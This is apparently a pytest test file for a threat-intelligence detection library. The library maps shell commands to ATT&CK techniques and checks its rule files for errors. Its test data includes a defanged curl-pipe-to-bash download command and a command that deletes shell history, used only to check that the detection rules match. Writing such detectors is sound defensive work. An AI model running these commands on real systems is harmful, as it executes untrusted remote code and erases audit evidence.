import pytest

from interlinear_cti import cli
from interlinear_cti.rules import LibraryError, load_library, run_examples


def test_seed_library_loads_and_every_example_passes(resolver):
    library = load_library(resolver=resolver)
    assert len(library.rules) >= 25
    assert run_examples(library) == []


def test_first_matching_rule_wins():
    library = load_library()
    assert library.match("curl -s hxxp://203.0.113[.]5/x.sh | bash").id == "download-pipe-shell"
    assert library.match("rm -f ~/.bash_history").id == "clear-history"
    assert library.match("frobnicate --all") is None


def write_library(folder, rules_yaml):
    folder.mkdir(exist_ok=True)
    (folder / "VERSION").write_text("test.0\n", encoding="utf-8")
    (folder / "10-test.yaml").write_text(rules_yaml, encoding="utf-8")
    return folder


def test_revoked_techniques_fail_the_load(tmp_path, resolver):
    folder = write_library(tmp_path / "lib", "- id: old\n  match: {regex: 'x'}\n  meaning: Old.\n  techniques: [T1562.003]\n")
    with pytest.raises(LibraryError, match=r"technique T1562.003 is revoked \(replaced by T1690\)"):
        load_library(folder, resolver=resolver)


def test_unknown_techniques_fail_the_load(tmp_path, resolver):
    folder = write_library(tmp_path / "lib", "- id: bad\n  match: {regex: 'x'}\n  meaning: Bad.\n  techniques: [T9999]\n")
    with pytest.raises(LibraryError, match="technique T9999 is unknown"):
        load_library(folder, resolver=resolver)


# Rule IDs are at least two characters, so these use "ab".
@pytest.mark.parametrize("yaml_text, message", [
    ("- id: ab\n  match: {regex: '('}\n  meaning: M.\n  techniques: [T1105]\n", "bad match.regex"),
    ("- id: ab\n  match: {regex: 'x'}\n  meaning: M.\n  techniques: [T1105]\n- id: ab\n  match: {regex: 'y'}\n  meaning: M.\n  techniques: [T1105]\n", "duplicate rule id"),
    ("- id: ab\n  match: {regex: 'x'}\n  meaning: M.\n  context: true\n  techniques: [T1105]\n", "context rules carry no techniques"),
    ("- id: ab\n  match: {regex: 'x'}\n  meaning: M.\n", "needs at least one technique"),
    ("- id: ab\n  match: {regex: 'x'}\n  meaning: M.\n  techniques: [T1105]\n  iocs: [email]\n", "unknown IOC type"),
])
def test_malformed_rules_fail_the_load(tmp_path, yaml_text, message):
    with pytest.raises(LibraryError, match=message):
        load_library(write_library(tmp_path / "lib", yaml_text))


def test_shadowed_examples_are_reported(tmp_path):
    # The narrow regex is anchored: unanchored, curl.*bash is quadratic, and run_examples() now times every rule.
    folder = write_library(tmp_path / "lib", (
        "- id: broad\n  match: {regex: 'curl'}\n  meaning: Broad.\n  techniques: [T1105]\n"
        "- id: narrow\n  match: {regex: '^curl.*bash'}\n  meaning: Narrow.\n  techniques: [T1059.004]\n"
        "  examples: {match: ['curl x | bash']}\n"))
    assert run_examples(load_library(folder)) == [
        "narrow: expected to match 'curl x | bash', but broad matched"]


def test_cli_rules_test_passes(capsys):
    assert cli.main(["rules", "test"]) == 0
    assert "0 failures" in capsys.readouterr().out
